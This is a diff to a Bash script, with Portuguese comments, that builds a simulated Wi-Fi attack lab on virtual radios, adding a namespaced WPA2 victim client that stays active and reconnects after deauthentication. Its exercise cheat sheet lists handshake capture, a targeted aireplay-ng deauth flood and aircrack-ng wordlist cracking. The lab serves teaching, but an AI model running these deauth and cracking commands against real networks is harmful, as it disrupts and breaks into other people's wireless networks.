@@ -28,6 +28,7 @@ MACACL_ALLOWED="02:ca:fe:00:11:22"                       # único MAC na allowli
 # Sub-redes IP
 OPEN_NET="10.0.4";   OPEN_AP_IP="${OPEN_NET}.1"
 MACACL_NET="10.0.9"; MACACL_AP_IP="${MACACL_NET}.1"
+WPA2_NET="10.0.11";  WPA2_AP_IP="${WPA2_NET}.1"
 
 # Interfaces no HOST (hwsim).
 AP_WPA2="wlan_wpa2"; AP_OPEN="wlan_open"
@@ -163,6 +164,10 @@ EOF
   hostapd -B -t -f "$LAB_DIR/hostapd_wpa2.log" "$LAB_DIR/ap_wpa2.conf" && OK "AP $SSID_WPA2" || ERR "WPA2 falhou"
   hostapd -B -t -f "$LAB_DIR/hostapd_open.log" "$LAB_DIR/ap_open.conf" && OK "AP $SSID_OPEN" || ERR "OPEN falhou"
   sleep 2
+
+  # IP no lado do AP WPA2 para o cliente (em netns) pingar atravessando o rádio
+  ip addr flush dev "$AP_WPA2" 2>/dev/null
+  ip addr add "${WPA2_AP_IP}/24" dev "$AP_WPA2" 2>/dev/null; ip link set "$AP_WPA2" up
 
   ip addr flush dev "$AP_OPEN" 2>/dev/null
   ip addr add "${OPEN_AP_IP}/24" dev "$AP_OPEN"; ip link set "$AP_OPEN" up
@@ -371,10 +376,9 @@ EOF
 #  Clientes: WPA2 (handshake) + vítima Enterprise (MSCHAPv2)
 # ===========================================================================
 start_host_clients() {
-  LOG "Cliente WPA2 (gera handshake)..."
-  for pair in "$STA_WPA2|$SSID_WPA2|$WPA2_PSK"; do
-    IFS='|' read -r ifc ssid psk <<< "$pair"
-    cat > "$LAB_DIR/${ifc}.conf" <<EOF
+  LOG "Cliente WPA2 (STATION ativo + handshake a cada reconexão)..."
+  local ifc="$STA_WPA2" ssid="$SSID_WPA2" psk="$WPA2_PSK"
+  cat > "$LAB_DIR/${ifc}.conf" <<EOF
 ctrl_interface=/run/wpa_${ifc}
 network={
     ssid="${ssid}"
@@ -382,16 +386,14 @@ network={
     psk="${psk}"
 }
 EOF
-    wpa_supplicant -B -i "$ifc" -c "$LAB_DIR/${ifc}.conf" -f "$LAB_DIR/${ifc}.log" 2>/dev/null \
-      && OK "  $ifc -> $ssid (daemon no ar)" || WARN "  $ifc não subiu"
 
-    # Watchdog: mantém a vítima SEMPRE reconectada, como um cliente real. Sem
-    # isso, após um flood de deauth o wpa_supplicant marca a rede como
-    # "temporarily disabled" (backoff) e não volta sozinho -> o aluno veria a
-    # vítima nunca mais reconectar depois do ataque. O loop reabilita e manda
-    # reconectar a cada 5s enquanto não estiver COMPLETED, gerando um novo
-    # 4-way handshake a cada reconexão (exercício repetível).
-    cat > "$LAB_DIR/${ifc}_watchdog.sh" <<EOF
+  # Watchdog: mantém a vítima SEMPRE reconectada, como um cliente real. Sem
+  # isso, após um flood de deauth o wpa_supplicant marca a rede como
+  # "temporarily disabled" (backoff) e não volta sozinho -> o aluno veria a
+  # vítima nunca mais reconectar depois do ataque. O loop reabilita e manda
+  # reconectar a cada 5s enquanto não estiver COMPLETED, gerando um novo
+  # 4-way handshake a cada reconexão (exercício repetível).
+  cat > "$LAB_DIR/${ifc}_watchdog.sh" <<EOF
 #!/bin/bash
 while true; do
   if ! wpa_cli -p /run/wpa_${ifc} -i ${ifc} status 2>/dev/null | grep -q 'wpa_state=COMPLETED'; then
@@ -401,15 +403,55 @@ while true; do
   sleep 5
 done
 EOF
-    chmod +x "$LAB_DIR/${ifc}_watchdog.sh"
-    nohup bash "$LAB_DIR/${ifc}_watchdog.sh" >/dev/null 2>&1 &
-    echo $! > "$LAB_DIR/${ifc}_watchdog.pid"
-    OK "  watchdog de reconexão ativo ($ifc volta sozinho após o deauth)"
-  done
+  chmod +x "$LAB_DIR/${ifc}_watchdog.sh"
+
+  # Motivo do netns (igual OPEN/MACACL): se cliente e AP ficam no MESMO
+  # namespace, o tráfego cliente<->AP é entregue por loopback e NÃO passa pelo
+  # rádio -> o monitor não vê o STATION (ele "demora minutos a aparecer") e o
+  # 4-way quase não reaparece no deauth. Num netns separado o tráfego é
+  # obrigado a sair pelo rádio virtual; como o meio do hwsim é global, o
+  # mon_lab captura tudo (STATION ativo, deauth e o handshake na reconexão).
+  local phy; phy=$(phy_of "$ifc")
+  if [[ -n "$phy" ]] && ip netns add "$WPA2_NS" 2>/dev/null; then
+    ip link set "$ifc" down 2>/dev/null
+    if iw phy "$phy" set netns name "$WPA2_NS" 2>/dev/null; then
+      ip netns exec "$WPA2_NS" ip link set lo up 2>/dev/null
+      ip netns exec "$WPA2_NS" ip link set "$ifc" up 2>/dev/null
+      ip netns exec "$WPA2_NS" wpa_supplicant -B -i "$ifc" \
+        -c "$LAB_DIR/${ifc}.conf" -f "$LAB_DIR/${ifc}.log" 2>/dev/null
+      sleep 3
+      ip netns exec "$WPA2_NS" ip addr add "${WPA2_NET}.60/24" dev "$ifc" 2>/dev/null
+      # tráfego contínuo: atravessa o rádio (ARP+ICMP visíveis no monitor) e
+      # mantém o STATION sempre na lista do airodump no canal 11.
+      nohup ip netns exec "$WPA2_NS" bash -c \
+        "while true; do ping -c 1 -W 1 ${WPA2_AP_IP} >/dev/null 2>&1; sleep 1; done" >/dev/null 2>&1 &
+      echo $! > "$LAB_DIR/wpa2_traffic.pid"
+      # watchdog DENTRO do netns (onde vive o wpa_supplicant e o socket ctrl)
+      nohup ip netns exec "$WPA2_NS" bash "$LAB_DIR/${ifc}_watchdog.sh" >/dev/null 2>&1 &
+      echo $! > "$LAB_DIR/${ifc}_watchdog.pid"
+      OK "  $ifc -> $ssid (netns $WPA2_NS, STATION ativo no canal 11)"
+      OK "  watchdog de reconexão ativo ($ifc reconecta sozinho após o deauth)"
+      return 0
+    else
+      WARN "  Falha ao mover o rádio p/ o netns; usando modo simples."
+      ip netns del "$WPA2_NS" 2>/dev/null
+    fi
+  else
+    WARN "  Sem netns disponível; usando modo simples."
+  fi
+
+  # Fallback (sem netns): associa no namespace raiz + watchdog no raiz. O
+  # STATION aparece ao (re)associar, mas sem data frames contínuos.
+  wpa_supplicant -B -i "$ifc" -c "$LAB_DIR/${ifc}.conf" -f "$LAB_DIR/${ifc}.log" 2>/dev/null \
+    && OK "  $ifc -> $ssid (daemon no ar)" || WARN "  $ifc não subiu"
+  nohup bash "$LAB_DIR/${ifc}_watchdog.sh" >/dev/null 2>&1 &
+  echo $! > "$LAB_DIR/${ifc}_watchdog.pid"
+  OK "  watchdog de reconexão ativo ($ifc volta sozinho após o deauth)"
 }
 
 OPEN_NS="xpsec_open"       # netns do cliente da rede OPEN (tráfego visível no monitor)
 MACACL_NS="xpsec_macacl"   # netns do cliente autorizado
+WPA2_NS="xpsec_wpa2"       # netns do cliente WPA2 (STATION ativo + handshake)
 
 start_macacl_client() {
   LOG "Cliente autorizado do filtro de MAC (clona $MACACL_ALLOWED e gera tráfego REAL no ar)..."
@@ -511,6 +553,7 @@ EOF
 lab_down() {
   LOG "Derrubando lab..."
   for p in "$LAB_DIR/open_server.pid" "$LAB_DIR/open_bot.pid" "$LAB_DIR/macacl_traffic.pid" \
+           "$LAB_DIR/wpa2_traffic.pid" \
            "$LAB_DIR/${STA_WPA2}_watchdog.pid" "$LAB_DIR/sta_corp_watchdog.pid"; do
     [[ -f "$p" ]] && kill "$(cat "$p")" 2>/dev/null
   done
@@ -520,7 +563,7 @@ lab_down() {
   pkill -x hostapd-wpe 2>/dev/null
   pkill -f "dnsmasq.*${AP_OPEN}" 2>/dev/null
   # netns dos clientes (OPEN e MACACL): mata processos dentro e remove
-  for _ns in "${OPEN_NS:-xpsec_open}" "${MACACL_NS:-xpsec_macacl}"; do
+  for _ns in "${OPEN_NS:-xpsec_open}" "${MACACL_NS:-xpsec_macacl}" "${WPA2_NS:-xpsec_wpa2}"; do
     if ip netns list 2>/dev/null | grep -q "$_ns"; then
       ip netns pids "$_ns" 2>/dev/null | xargs -r kill 2>/dev/null
       ip netns del "$_ns" 2>/dev/null && OK "netns $_ns removido."
@@ -549,6 +592,13 @@ lab_status() {
       | awk '/Connected|SSID/{print "  "$0}' || echo "  (no netns, sem link)"
   else
     echo "  (netns ausente)"
+  fi
+  echo; LOG "Cliente WPA2 (netns ${WPA2_NS:-xpsec_wpa2}):"
+  if ip netns list 2>/dev/null | grep -q "${WPA2_NS:-xpsec_wpa2}"; then
+    ip netns exec "${WPA2_NS:-xpsec_wpa2}" iw dev "$STA_WPA2" link 2>/dev/null \
+      | awk '/Connected|SSID/{print "  "$0}' || echo "  (no netns, sem link)"
+  else
+    echo "  (netns ausente / modo raiz)"
   fi
 }
 
@@ -583,9 +633,11 @@ $(echo -e '\e[1;32m')===========================================================
   sudo airodump-ng -c 3 --bssid <BSSID_OPEN> -w /tmp/open $MON_IF
   wireshark /tmp/open-01.cap   # http.request.method == "POST"
 
-  # WPA2 (2.4): handshake + wordlist
+  # WPA2 (2.4): handshake + wordlist. O cliente sta_wpa2 fica SEMPRE ativo
+  # (STATION visível no canal 11). Direcione o deauth ao MAC do cliente (-c),
+  # mais confiável que broadcast; ele reconecta em ~5s -> handshake capturado.
   sudo airodump-ng -c 11 --bssid <BSSID_WPA2> -w /tmp/wpa2 $MON_IF
-  sudo aireplay-ng -0 3 -a <BSSID_WPA2> $MON_IF
+  sudo aireplay-ng -0 5 -a <BSSID_WPA2> -c <STA_WPA2_MAC> $MON_IF
   printf '123456\\nverao2024\\nadmin123\\n' > /tmp/wl.txt ; aircrack-ng -w /tmp/wl.txt /tmp/wpa2-01.cap
 
   # PMKID (5GHz): SEM cliente, SEM deauth
